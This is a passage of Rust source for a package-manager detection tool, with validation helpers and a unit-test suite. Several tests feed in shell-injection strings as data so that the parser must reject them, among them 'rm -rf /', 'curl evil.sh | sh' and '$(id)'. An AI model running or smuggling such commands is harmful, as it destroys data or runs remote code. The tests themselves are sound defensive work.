/// A manifest shipping `__proto__`, `constructor`, or `prototype` is aiming at a
/// JavaScript consumer (the `lodash.merge` CVE-2019-10744 class); uf never treats
/// those keys as data.
fn report_polluting_keys(path: &Utf8Path, manifest: &Value, issues: &mut DetectionIssues) {
    let Some(object) = manifest.as_object() else {
        return;
    };

    for (key, _) in object.iter().filter(|(key, _)| is_polluting_json_key(key)) {
        let issue = DetectionIssue::PollutingManifestKey {
            manifest: path.to_path_buf(),
            key: key.as_str().to_compact_string(),
        };
        if !issues.contains(&issue) {
            issues.push(issue);
        }
    }
}

fn is_regular_file(path: &Utf8Path) -> bool {
    // Never follow a symlink: a lockfile symlinked out of the tree must not vote.
    fs::symlink_metadata(path).is_ok_and(|metadata| metadata.is_file())
}

fn read_file_head(path: &Utf8Path, limit: usize) -> Vec<u8> {
    let Ok(metadata) = fs::symlink_metadata(path) else {
        return Vec::new();
    };
    if !metadata.is_file() {
        return Vec::new();
    }
    let Ok(file) = fs::File::open(path) else {
        return Vec::new();
    };

    let mut head = Vec::with_capacity(limit.min(metadata.len() as usize + 1));
    if file.take(limit as u64).read_to_end(&mut head).is_err() {
        return Vec::new();
    }
    head
}

/// Resolve `.` and `..` without touching the filesystem.
///
/// Purely lexical on purpose: resolving through symlinks would let a crafted
/// checkout point the walk at a directory outside the boundary.
fn lexically_normalized(path: &Utf8Path) -> Utf8PathBuf {
    let mut normalized = Utf8PathBuf::new();

    for component in path.components() {
        match component {
            Utf8Component::CurDir => {}
            Utf8Component::ParentDir => {
                if matches!(
                    normalized.components().next_back(),
                    Some(Utf8Component::Normal(_))
                ) {
                    normalized.pop();
                } else if normalized.as_str().is_empty() {
                    normalized.push("..");
                }
                // At a root, `..` is the root itself, matching POSIX resolution.
            }
            other => normalized.push(other.as_str()),
        }
    }

    normalized
}

fn take_number(value: &str, cursor: &mut usize) -> Result<u32, PackageManagerFieldError> {
    let bytes = value.as_bytes();
    let start = *cursor;
    while bytes.get(*cursor).is_some_and(u8::is_ascii_digit) {
        *cursor += 1;
    }

    if start == *cursor {
        return Err(PackageManagerFieldError::MalformedVersion {
            version: truncated(&value[start.min(value.len())..]),
        });
    }

    value[start..*cursor]
        .parse::<u32>()
        .map_err(|_| PackageManagerFieldError::VersionOverflow {
            component: truncated(&value[start..*cursor]),
        })
}

fn expect_dot(value: &str, cursor: &mut usize) -> Result<(), PackageManagerFieldError> {
    if value.as_bytes().get(*cursor) == Some(&b'.') {
        *cursor += 1;
        return Ok(());
    }
    Err(PackageManagerFieldError::MalformedVersion {
        version: truncated(&value[(*cursor).min(value.len())..]),
    })
}

/// Consume a `[0-9A-Za-z.-]+` run, stopping before `+` or at the end of input.
fn take_tagged_segment(
    value: &str,
    cursor: &mut usize,
) -> Result<CompactString, PackageManagerFieldError> {
    let bytes = value.as_bytes();
    let start = *cursor;

    while let Some(byte) = bytes.get(*cursor) {
        if byte.is_ascii_alphanumeric() || *byte == b'.' || *byte == b'-' {
            *cursor += 1;
        } else {
            break;
        }
    }

    if start == *cursor {
        return Err(forbidden_character(value, start));
    }
    Ok(value[start..*cursor].to_compact_string())
}

fn forbidden_character(value: &str, offset: usize) -> PackageManagerFieldError {
    let character = value
        .get(offset..)
        .and_then(|rest| rest.chars().next())
        .unwrap_or(char::REPLACEMENT_CHARACTER);
    PackageManagerFieldError::ForbiddenCharacter { character, offset }
}

/// Keep untrusted text out of error messages beyond a fixed budget.
fn truncated(value: &str) -> CompactString {
    const BUDGET: usize = 32;

    let end = value
        .char_indices()
        .map(|(index, character)| index + character.len_utf8())
        .take_while(|end| *end <= BUDGET)
        .last()
        .unwrap_or(0);
    value[..end].to_compact_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_root() -> (tempfile::TempDir, Utf8PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let root = Utf8PathBuf::from_path_buf(dir.path().to_path_buf()).unwrap();
        (dir, root)
    }

    fn write(path: &Utf8Path, contents: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, contents).unwrap();
    }

    /// Detect inside a hermetic tree: the boundary keeps the ancestor walk from
    /// noticing lockfiles that happen to live above the system temp directory.
    fn detect_within(root: &Utf8Path, start: &Utf8Path) -> Detection {
        detect_package_manager_with(start, &DetectionOptions::new().with_boundary(root))
    }

    #[test]
    fn empty_directory_defaults_to_uf_native() {
        let (_guard, root) = temp_root();

        let detection = detect_within(&root, &root);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert_eq!(detection.source, DetectionSource::Default);
        assert_eq!(detection.source.kind(), "default");
        assert!(detection.alternatives.is_empty());
        assert!(detection.issues.is_empty());
        assert!(detection.is_uf_native());
        assert!(!detection.is_ambiguous());
    }

    #[test]
    fn uf_lock_detects_the_native_resolver() {
        let (_guard, root) = temp_root();
        write(&root.join("uf.lock"), "{}\n");

        let detection = detect_within(&root, &root);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert_eq!(detection.source.kind(), "lockfile");
    }

    #[test]
    fn pnpm_lockfile_detects_pnpm() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");

        let detection = detect_within(&root, &root);

        assert_eq!(detection.package_manager, PackageManager::Pnpm);
        assert_eq!(
            detection.source,
            DetectionSource::Lockfile {
                lockfile: Lockfile::PnpmLock,
                path: root.join("pnpm-lock.yaml"),
            }
        );
    }

    #[test]
    fn package_lock_detects_npm() {
        let (_guard, root) = temp_root();
        write(&root.join("package-lock.json"), "{}\n");

        assert_eq!(
            detect_within(&root, &root).package_manager,
            PackageManager::Npm
        );
    }

    #[test]
    fn npm_shrinkwrap_detects_npm() {
        let (_guard, root) = temp_root();
        write(&root.join("npm-shrinkwrap.json"), "{}\n");

        assert_eq!(
            detect_within(&root, &root).package_manager,
            PackageManager::Npm
        );
    }

    #[test]
    fn bun_text_lockfile_detects_bun() {
        let (_guard, root) = temp_root();
        write(&root.join("bun.lock"), "{}\n");

        assert_eq!(
            detect_within(&root, &root).package_manager,
            PackageManager::Bun
        );
    }

    #[test]
    fn bun_binary_lockfile_detects_bun() {
        let (_guard, root) = temp_root();
        write(&root.join("bun.lockb"), "\0binary\n");

        assert_eq!(
            detect_within(&root, &root).package_manager,
            PackageManager::Bun
        );
    }

    #[test]
    fn both_bun_lockfiles_are_one_manager_not_an_ambiguity() {
        let (_guard, root) = temp_root();
        write(&root.join("bun.lock"), "{}\n");
        write(&root.join("bun.lockb"), "\0binary\n");

        let detection = detect_within(&root, &root);

        assert_eq!(detection.package_manager, PackageManager::Bun);
        assert!(!detection.is_ambiguous());
        assert_eq!(detection.alternatives.len(), 1);
    }

    #[test]
    fn plain_yarn_lock_detects_yarn_classic() {
        let (_guard, root) = temp_root();
        write(&root.join("yarn.lock"), "# yarn lockfile v1\n\n");

        assert_eq!(
            detect_within(&root, &root).package_manager,
            PackageManager::Yarn(YarnEdition::Classic)
        );
    }

    #[test]
    fn yarn_lock_metadata_header_detects_berry() {
        let (_guard, root) = temp_root();
        write(
            &root.join("yarn.lock"),
            "# This file is generated by running \"yarn install\"\n\n__metadata:\n  version: 8\n",
        );

        assert_eq!(
            detect_within(&root, &root).package_manager,
            PackageManager::Yarn(YarnEdition::Berry)
        );
    }

    #[test]
    fn yarnrc_yml_detects_berry_even_without_a_lockfile_header() {
        let (_guard, root) = temp_root();
        write(&root.join("yarn.lock"), "");
        write(&root.join(".yarnrc.yml"), "nodeLinker: node-modules\n");

        assert_eq!(
            detect_within(&root, &root).package_manager,
            PackageManager::Yarn(YarnEdition::Berry)
        );
    }

    #[test]
    fn yarn_edition_probe_ignores_a_huge_lockfile_tail() {
        let (_guard, root) = temp_root();
        let mut lock = String::from("# yarn lockfile v1\n");
        lock.push_str(&"# padding\n".repeat(4096));
        lock.push_str("__metadata:\n");
        write(&root.join("yarn.lock"), &lock);

        // The `__metadata:` marker sits past the probe window, so the header wins.
        assert_eq!(yarn_edition_in(&root), YarnEdition::Classic);
    }

    #[test]
    fn side_by_side_lockfiles_report_ambiguity_without_silently_picking() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        write(&root.join("package-lock.json"), "{}\n");
        write(&root.join("yarn.lock"), "# yarn lockfile v1\n");

        let detection = detect_within(&root, &root);

        assert_eq!(detection.package_manager, PackageManager::Pnpm);
        assert!(detection.is_ambiguous());
        let DetectionOutcome::Ambiguous { lockfiles } = &detection.outcome else {
            panic!("expected an ambiguous outcome");
        };
        assert_eq!(
            lockfiles.as_slice(),
            [
                Lockfile::PnpmLock,
                Lockfile::YarnLock,
                Lockfile::PackageLock
            ]
        );
        assert_eq!(detection.alternatives.len(), 2);
    }

    #[test]
    fn uf_lock_outranks_every_other_lockfile() {
        let (_guard, root) = temp_root();
        for lockfile in Lockfile::ALL {
            write(&root.join(lockfile.file_name()), "");
        }

        let detection = detect_within(&root, &root);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert!(detection.is_ambiguous());
        assert_eq!(detection.alternatives.len(), Lockfile::ALL.len() - 1);
    }

    #[test]
    fn package_manager_field_outranks_a_lockfile() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        write(
            &root.join("package.json"),
            r#"{ "name": "demo", "packageManager": "yarn@4.1.0" }"#,
        );

        let detection = detect_within(&root, &root);

        assert_eq!(
            detection.package_manager,
            PackageManager::Yarn(YarnEdition::Berry)
        );
        assert_eq!(detection.source.kind(), "package-manager-field");
        assert_eq!(
            detection.alternatives[0].package_manager,
            PackageManager::Pnpm
        );
        assert!(!detection.is_ambiguous());
    }

    #[test]
    fn package_manager_field_keeps_the_parsed_version_and_integrity() {
        let (_guard, root) = temp_root();
        write(
            &root.join("package.json"),
            r#"{ "packageManager": "pnpm@9.1.0+sha512.abc123" }"#,
        );

        let detection = detect_within(&root, &root);

        let DetectionSource::PackageManagerField { spec, manifest } = &detection.source else {
            panic!("expected the packageManager field to decide detection");
        };
        assert_eq!(manifest, &root.join("package.json"));
        assert_eq!(spec.manager, PackageManager::Pnpm);
        assert_eq!(spec.version.to_string(), "9.1.0");
        assert_eq!(spec.integrity.as_deref(), Some("sha512.abc123"));
    }

    #[test]
    fn config_override_outranks_the_package_manager_field() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        write(
            &root.join("package.json"),
            r#"{ "packageManager": "yarn@4.1.0" }"#,
        );

        let options = DetectionOptions::new()
            .with_boundary(&root)
            .with_config_override(PackageManager::Bun);
        let detection = detect_package_manager_with(&root, &options);

        assert_eq!(detection.package_manager, PackageManager::Bun);
        assert_eq!(detection.source, DetectionSource::ConfigOverride);
        assert_eq!(detection.alternatives.len(), 2);
        assert_eq!(
            detection.alternatives[0].package_manager,
            PackageManager::Yarn(YarnEdition::Berry)
        );
        assert_eq!(
            detection.alternatives[1].package_manager,
            PackageManager::Pnpm
        );
    }

    #[test]
    fn local_lockfile_outranks_the_ancestor_workspace_root() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        let package = root.join("packages/app");
        write(&package.join("bun.lock"), "{}\n");

        let detection = detect_within(&root, &package);

        assert_eq!(detection.package_manager, PackageManager::Bun);
        assert_eq!(detection.source.kind(), "lockfile");
        assert_eq!(
            detection.alternatives[0].package_manager,
            PackageManager::Pnpm
        );
        assert_eq!(detection.alternatives[0].source.kind(), "workspace-root");
    }

    #[test]
    fn ancestor_lockfile_is_inherited_by_a_workspace_member() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        let package = root.join("packages/app");
        write(&package.join("package.json"), r#"{ "name": "app" }"#);

        let detection = detect_within(&root, &package);

        assert_eq!(detection.package_manager, PackageManager::Pnpm);
        assert_eq!(
            detection.source,
            DetectionSource::WorkspaceRoot {
                root: root.clone(),
                marker: WorkspaceMarker::Lockfile(Lockfile::PnpmLock),
            }
        );
    }

    #[test]
    fn pnpm_workspace_yaml_marks_the_workspace_root() {
        let (_guard, root) = temp_root();
        write(
            &root.join("pnpm-workspace.yaml"),
            "packages:\n  - packages/*\n",
        );
        let package = root.join("packages/app");
        write(&package.join("package.json"), r#"{ "name": "app" }"#);

        let detection = detect_within(&root, &package);

        assert_eq!(detection.package_manager, PackageManager::Pnpm);
        assert_eq!(
            detection.source,
            DetectionSource::WorkspaceRoot {
                root: root.clone(),
                marker: WorkspaceMarker::PnpmWorkspaceYaml,
            }
        );
    }

    #[test]
    fn package_json_workspaces_marks_the_workspace_root() {
        let (_guard, root) = temp_root();
        write(
            &root.join("package.json"),
            r#"{ "workspaces": ["packages/*"], "packageManager": "npm@10.5.0" }"#,
        );
        let package = root.join("packages/app");
        write(&package.join("package.json"), r#"{ "name": "app" }"#);

        let detection = detect_within(&root, &package);

        assert_eq!(detection.package_manager, PackageManager::Npm);
        assert_eq!(
            detection.source,
            DetectionSource::WorkspaceRoot {
                root: root.clone(),
                marker: WorkspaceMarker::PackageJsonWorkspaces,
            }
        );
    }

    #[test]
    fn yarn_object_workspaces_mark_the_workspace_root() {
        let (_guard, root) = temp_root();
        write(
            &root.join("package.json"),
            r#"{ "workspaces": { "packages": ["packages/*"] }, "packageManager": "yarn@1.22.19" }"#,
        );
        let package = root.join("packages/app");
        fs::create_dir_all(&package).unwrap();

        let detection = detect_within(&root, &package);

        assert_eq!(
            detection.package_manager,
            PackageManager::Yarn(YarnEdition::Classic)
        );
    }

    #[test]
    fn empty_workspaces_array_is_not_a_workspace_root() {
        let (_guard, root) = temp_root();
        write(
            &root.join("package.json"),
            r#"{ "workspaces": [], "packageManager": "npm@10.5.0" }"#,
        );
        let package = root.join("packages/app");
        fs::create_dir_all(&package).unwrap();

        assert_eq!(
            detect_within(&root, &package).package_manager,
            PackageManager::Uf
        );
    }

    #[test]
    fn a_workspace_root_without_manager_evidence_falls_back_to_uf() {
        let (_guard, root) = temp_root();
        write(&root.join("package.json"), r#"{ "workspaces": ["pkg/*"] }"#);
        let package = root.join("pkg/app");
        fs::create_dir_all(&package).unwrap();

        let detection = detect_within(&root, &package);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert_eq!(detection.source, DetectionSource::Default);
    }

    #[test]
    fn the_ancestor_walk_stops_at_a_git_directory() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        let repo = root.join("repo");
        fs::create_dir_all(repo.join(".git")).unwrap();
        let package = repo.join("app");
        fs::create_dir_all(&package).unwrap();

        let detection = detect_within(&root, &package);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert_eq!(detection.source, DetectionSource::Default);
    }

    #[test]
    fn the_ancestor_walk_is_depth_bounded() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        let deep = root.join("a/b/c/d");
        fs::create_dir_all(&deep).unwrap();

        let options = DetectionOptions::new()
            .with_boundary(&root)
            .with_max_ancestors(2);
        let detection = detect_package_manager_with(&deep, &options);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert!(
            detection
                .issues
                .contains(&DetectionIssue::AncestorLimitReached { limit: 2 })
        );
    }

    #[test]
    fn the_ancestor_walk_never_reads_outside_the_boundary() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        let inner = root.join("inner");
        let package = inner.join("app");
        fs::create_dir_all(&package).unwrap();

        let bounded =
            detect_package_manager_with(&package, &DetectionOptions::new().with_boundary(&inner));
        assert_eq!(bounded.package_manager, PackageManager::Uf);

        let unbounded =
            detect_package_manager_with(&package, &DetectionOptions::new().with_boundary(&root));
        assert_eq!(unbounded.package_manager, PackageManager::Pnpm);
    }

    #[test]
    fn a_start_path_that_escapes_the_boundary_reads_nothing() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        let inner = root.join("inner");
        fs::create_dir_all(&inner).unwrap();

        let escape = inner.join("..");
        let detection =
            detect_package_manager_with(&escape, &DetectionOptions::new().with_boundary(&inner));

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert_eq!(detection.source, DetectionSource::Default);
        assert!(matches!(
            detection.issues.first(),
            Some(DetectionIssue::OutsideBoundary { .. })
        ));
    }

    #[cfg(unix)]
    #[test]
    fn a_symlinked_lockfile_never_votes() {
        let (_guard, root) = temp_root();
        let outside = root.join("outside");
        let project = root.join("project");
        fs::create_dir_all(&outside).unwrap();
        fs::create_dir_all(&project).unwrap();
        write(&outside.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        std::os::unix::fs::symlink(
            outside.join("pnpm-lock.yaml").as_std_path(),
            project.join("pnpm-lock.yaml").as_std_path(),
        )
        .unwrap();

        let detection = detect_within(&root, &project);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert!(scan_lockfiles(&project).is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn a_symlinked_manifest_is_refused_instead_of_followed() {
        let (_guard, root) = temp_root();
        let outside = root.join("outside");
        let project = root.join("project");
        fs::create_dir_all(&outside).unwrap();
        fs::create_dir_all(&project).unwrap();
        write(
            &outside.join("package.json"),
            r#"{ "packageManager": "bun@1.1.0" }"#,
        );
        std::os::unix::fs::symlink(
            outside.join("package.json").as_std_path(),
            project.join("package.json").as_std_path(),
        )
        .unwrap();

        let detection = detect_within(&root, &project);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert!(
            detection
                .issues
                .contains(&DetectionIssue::ManifestUnusable {
                    manifest: project.join("package.json"),
                    fault: ManifestFault::NotARegularFile,
                })
        );
    }

    #[test]
    fn a_hostile_package_manager_field_is_rejected_and_never_executed() {
        let (_guard, root) = temp_root();
        write(
            &root.join("package.json"),
            r#"{ "packageManager": "pnpm@9.0.0; rm -rf /" }"#,
        );

        let detection = detect_within(&root, &root);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert_eq!(detection.source, DetectionSource::Default);
        assert!(matches!(
            detection.issues.first(),
            Some(DetectionIssue::InvalidPackageManagerField {
                error: PackageManagerFieldError::ForbiddenCharacter { character: ';', .. },
                ..
            })
        ));
    }

    #[test]
    fn an_oversized_manifest_is_refused_with_a_typed_issue() {
        let (_guard, root) = temp_root();
        let mut manifest = String::from(r#"{ "packageManager": "pnpm@9.0.0", "pad": ""#);
        manifest.push_str(&"a".repeat(4096));
        manifest.push_str("\" }");
        write(&root.join("package.json"), &manifest);

        let options = DetectionOptions::new()
            .with_boundary(&root)
            .with_max_manifest_bytes(64);
        let detection = detect_package_manager_with(&root, &options);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        assert!(matches!(
            detection.issues.first(),
            Some(DetectionIssue::ManifestTooLarge { limit: 64, .. })
        ));
    }

    #[test]
    fn an_invalid_manifest_is_refused_with_a_typed_issue() {
        let (_guard, root) = temp_root();
        write(&root.join("package.json"), "{ not json");

        let detection = detect_within(&root, &root);

        assert!(
            detection
                .issues
                .contains(&DetectionIssue::ManifestUnusable {
                    manifest: root.join("package.json"),
                    fault: ManifestFault::InvalidJson,
                })
        );
    }

    #[test]
    fn a_non_object_manifest_is_refused() {
        let (_guard, root) = temp_root();
        write(&root.join("package.json"), "[1, 2, 3]");

        let detection = detect_within(&root, &root);

        assert!(
            detection
                .issues
                .contains(&DetectionIssue::ManifestUnusable {
                    manifest: root.join("package.json"),
                    fault: ManifestFault::InvalidJson,
                })
        );
    }

    #[test]
    fn prototype_pollution_keys_are_reported_and_ignored() {
        let (_guard, root) = temp_root();
        write(
            &root.join("package.json"),
            r#"{ "__proto__": { "packageManager": "npm@10.0.0" }, "constructor": {}, "prototype": {} }"#,
        );

        let detection = detect_within(&root, &root);

        assert_eq!(detection.package_manager, PackageManager::Uf);
        for key in ["__proto__", "constructor", "prototype"] {
            assert!(
                detection
                    .issues
                    .contains(&DetectionIssue::PollutingManifestKey {
                        manifest: root.join("package.json"),
                        key: CompactString::const_new(key),
                    })
            );
        }
    }

    #[test]
    fn a_manifest_with_a_bom_and_crlf_still_parses() {
        let (_guard, root) = temp_root();
        write(
            &root.join("package.json"),
            "\u{feff}{\r\n  \"packageManager\": \"bun@1.1.30\"\r\n}\r\n",
        );

        // serde_json rejects a BOM, so the manifest is refused rather than guessed at.
        let detection = detect_within(&root, &root);
        assert!(
            detection
                .issues
                .contains(&DetectionIssue::ManifestUnusable {
                    manifest: root.join("package.json"),
                    fault: ManifestFault::InvalidJson,
                })
        );

        write(
            &root.join("package.json"),
            "{\r\n  \"packageManager\": \"bun@1.1.30\"\r\n}\r\n",
        );
        assert_eq!(
            detect_within(&root, &root).package_manager,
            PackageManager::Bun
        );
    }

    #[test]
    fn a_non_ascii_package_manager_field_is_rejected() {
        let (_guard, root) = temp_root();
        write(
            &root.join("package.json"),
            "{ \"packageManager\": \"pnpm@9.0.0\u{3002}1\" }",
        );

        let detection = detect_within(&root, &root);

        assert!(matches!(
            detection.issues.first(),
            Some(DetectionIssue::InvalidPackageManagerField {
                error: PackageManagerFieldError::ForbiddenCharacter {
                    character: '\u{3002}',
                    ..
                },
                ..
            })
        ));
    }

    #[test]
    fn detection_round_trips_through_json() {
        let (_guard, root) = temp_root();
        write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
        write(
            &root.join("package.json"),
            r#"{ "packageManager": "yarn@4.1.0" }"#,
        );

        let detection = detect_within(&root, &root);
        let json = serde_json::to_string(&detection).unwrap();
        let parsed = serde_json::from_str::<Detection>(&json).unwrap();

        assert_eq!(parsed, detection);
        assert!(json.contains(r#""packageManager":"yarn-berry""#));
        assert!(json.contains(r#""kind":"package-manager-field""#));
    }

    #[test]
    fn detection_is_idempotent() {
        let (_guard, root) = temp_root();
        write(&root.join("bun.lock"), "{}\n");

        let first = detect_within(&root, &root);
        let second = detect_within(&root, &root);

        assert_eq!(first, second);
    }

    #[test]
    fn parses_every_supported_package_manager_field_name() {
        for (raw, expected) in [
            ("npm@10.5.0", PackageManager::Npm),
            ("pnpm@9.1.0", PackageManager::Pnpm),
            ("bun@1.1.30", PackageManager::Bun),
            ("yarn@1.22.19", PackageManager::Yarn(YarnEdition::Classic)),
            ("yarn@4.1.0", PackageManager::Yarn(YarnEdition::Berry)),
            ("yarn@2.0.0", PackageManager::Yarn(YarnEdition::Berry)),
        ] {
            let spec = parse_package_manager_field(raw).unwrap();
            assert_eq!(spec.manager, expected, "{raw}");
        }
    }

    #[test]
    fn parses_a_prerelease_and_integrity_suffix() {
        let spec = parse_package_manager_field("pnpm@9.0.0-beta.1+sha512.deadbeef-0").unwrap();

        assert_eq!(spec.manager, PackageManager::Pnpm);
        assert_eq!(spec.version.major, 9);
        assert_eq!(spec.version.prerelease.as_deref(), Some("beta.1"));
        assert_eq!(spec.integrity.as_deref(), Some("sha512.deadbeef-0"));
        assert_eq!(spec.version.to_string(), "9.0.0-beta.1");
    }

    #[test]
    fn parses_an_integrity_suffix_without_a_prerelease() {
        let spec = parse_package_manager_field("yarn@4.1.0+sha224.abc").unwrap();

        assert_eq!(spec.version.prerelease, None);
        assert_eq!(spec.integrity.as_deref(), Some("sha224.abc"));
    }

    #[test]
    fn rejects_an_empty_package_manager_field() {
        assert_eq!(
            parse_package_manager_field(""),
            Err(PackageManagerFieldError::Empty)
        );
    }

    #[test]
    fn rejects_a_package_manager_field_without_a_separator() {
        assert_eq!(
            parse_package_manager_field("pnpm"),
            Err(PackageManagerFieldError::MissingSeparator)
        );
    }

    #[test]
    fn rejects_an_unknown_package_manager_name() {
        assert_eq!(
            parse_package_manager_field("uf@1.0.0"),
            Err(PackageManagerFieldError::UnknownManager {
                name: CompactString::const_new("uf"),
            })
        );
    }

    #[test]
    fn rejects_a_shell_injection_attempt_with_a_typed_error() {
        // A hostile manifest must never reach a program name or an argument.
        let error = parse_package_manager_field("pnpm@9.0.0; rm -rf /").unwrap_err();

        assert_eq!(
            error,
            PackageManagerFieldError::ForbiddenCharacter {
                character: ';',
                offset: "pnpm@9.0.0".len(),
            }
        );
        assert!(error.to_string().contains("forbidden character"));
    }

    #[test]
    fn rejects_shell_metacharacters_anywhere_in_the_field() {
        for hostile in [
            "pnpm@9.0.0 && curl evil.sh | sh",
            "pnpm@9.0.0|whoami",
            "pnpm@9.0.0`id`",
            "pnpm@9.0.0$(id)",
            "pnpm@9.0.0\nnpm@1.0.0",
            "pnpm@9.0.0 --registry=http://evil",
            "../../bin/sh@1.0.0",
            "pnpm@9.0.0+sha512.abc;id",
        ] {
            assert!(
                parse_package_manager_field(hostile).is_err(),
                "accepted {hostile:?}"
            );
        }
    }

    #[test]
    fn rejects_a_malformed_version() {
        for raw in [
            "pnpm@",
            "pnpm@9",
            "pnpm@9.",
            "pnpm@9.1",
            "pnpm@9.1.",
            "pnpm@.1.0",
        ] {
            assert!(
                matches!(
                    parse_package_manager_field(raw),
                    Err(PackageManagerFieldError::MalformedVersion { .. })
                ),
                "accepted {raw:?}"
            );
        }
    }

    #[test]
    fn rejects_a_version_component_that_overflows_u32() {
        assert!(matches!(
            parse_package_manager_field("pnpm@99999999999.0.0"),
            Err(PackageManagerFieldError::VersionOverflow { .. })
        ));
    }

    #[test]
    fn rejects_an_empty_prerelease_or_integrity_segment() {
        assert!(parse_package_manager_field("pnpm@9.0.0-").is_err());
        assert!(parse_package_manager_field("pnpm@9.0.0+").is_err());
        assert!(parse_package_manager_field("pnpm@9.0.0-+sha512.a").is_err());
    }

    #[test]
    fn rejects_a_second_integrity_segment() {
        assert!(parse_package_manager_field("pnpm@9.0.0+sha1.a+sha1.b").is_err());
    }

    #[test]
    fn rejects_an_oversized_package_manager_field_before_parsing_it() {
        let raw = format!("pnpm@9.0.0+{}", "a".repeat(MAX_PACKAGE_MANAGER_FIELD_BYTES));

        assert!(matches!(
            parse_package_manager_field(&raw),
            Err(PackageManagerFieldError::TooLong { limit, .. })
                if limit == MAX_PACKAGE_MANAGER_FIELD_BYTES
        ));
    }

    #[test]
    fn a_pathological_package_manager_field_parses_in_one_pass() {
        // The classic ReDoS shape (`(a+)+$` fed a long run then a mismatch) is
        // linear here because the grammar is hand-written and every byte is
        // visited once; a backtracking regex would blow up on this input.
        let bounded = format!("pnpm@9.0.0-{}!", "a-.".repeat(38));
        assert!(bounded.len() <= MAX_PACKAGE_MANAGER_FIELD_BYTES);
        assert!(matches!(
            parse_package_manager_field(&bounded),
            Err(PackageManagerFieldError::ForbiddenCharacter { character: '!', .. })
        ));

        // Anything longer is refused by the length cap before parsing starts.
        let oversized = format!("pnpm@9.0.0-{}!", "a-.".repeat(4096));
        assert!(oversized.len() > MAX_PACKAGE_MANAGER_FIELD_BYTES);
        assert!(matches!(
            parse_package_manager_field(&oversized),
            Err(PackageManagerFieldError::TooLong { .. })
        ));
    }

    #[test]
    fn leading_zero_version_components_are_accepted_like_corepack() {
        let spec = parse_package_manager_field("npm@0010.0.0").unwrap();

        assert_eq!(spec.version.major, 10);
    }

    #[test]
    fn package_manager_identifiers_round_trip() {
        for manager in PackageManager::ALL {
            assert_eq!(PackageManager::parse(manager.as_str()), Some(manager));
            assert_eq!(manager.to_string(), manager.as_str());
        }
        assert_eq!(
            PackageManager::parse("yarn"),
            Some(PackageManager::Yarn(YarnEdition::Berry))
        );
        assert_eq!(PackageManager::parse("deno"), None);
    }

    #[test]
    fn package_manager_serializes_as_a_stable_string() {
        let json = serde_json::to_string(&PackageManager::Yarn(YarnEdition::Classic)).unwrap();

        assert_eq!(json, r#""yarn-classic""#);
        assert_eq!(
            serde_json::from_str::<PackageManager>(&json).unwrap(),
            PackageManager::Yarn(YarnEdition::Classic)
        );
        assert!(serde_json::from_str::<PackageManager>(r#""deno""#).is_err());
    }

    #[test]
    fn every_manager_declares_the_lockfile_it_writes() {
        assert_eq!(PackageManager::Uf.lockfile(), Lockfile::UfLock);
        assert_eq!(PackageManager::Npm.lockfile(), Lockfile::PackageLock);
        assert_eq!(PackageManager::Pnpm.lockfile(), Lockfile::PnpmLock);
        assert_eq!(PackageManager::Bun.lockfile(), Lockfile::BunLock);
        assert_eq!(
            PackageManager::Yarn(YarnEdition::Berry).lockfile(),
            Lockfile::YarnLock
        );
    }

    #[test]
    fn every_lockfile_maps_to_a_manager_and_a_file_name() {
        for lockfile in Lockfile::ALL {
            assert!(!lockfile.file_name().is_empty());
            assert_eq!(lockfile.to_string(), lockfile.file_name());
        }
        assert_eq!(Lockfile::UfLock.manager(), PackageManager::Uf);
        assert_eq!(Lockfile::BunLockb.manager(), PackageManager::Bun);
        assert_eq!(Lockfile::NpmShrinkwrap.manager(), PackageManager::Npm);
    }

    #[test]
    fn config_preferences_map_onto_managers() {
        assert_eq!(
            PackageManager::from_preference(PackageManagerPreference::Auto),
            None
        );
        assert_eq!(
            PackageManager::from_preference(PackageManagerPreference::Yarn),
            Some(PackageManager::Yarn(YarnEdition::Berry))
        );
        assert_eq!(
            PackageManager::from_preference(PackageManagerPreference::YarnClassic),
            Some(PackageManager::Yarn(YarnEdition::Classic))
        );
        assert_eq!(
            PackageManager::from_preference(PackageManagerPreference::Bun),
            Some(PackageManager::Bun)
        );
    }

    #[test]
    fn detection_options_default_to_the_documented_bounds() {
        let options = DetectionOptions::new();

        assert_eq!(options.max_ancestors, MAX_ANCESTOR_DEPTH);
        assert_eq!(options.max_manifest_bytes, MAX_MANIFEST_BYTES);
        assert_eq!(options.boundary, None);
        assert_eq!(options.config_override, None);
    }

    #[test]
    fn config_options_pick_up_the_package_manager_override() {
        let mut config = UniflowedConfig::default();
        assert_eq!(DetectionOptions::from_config(&config).config_override, None);

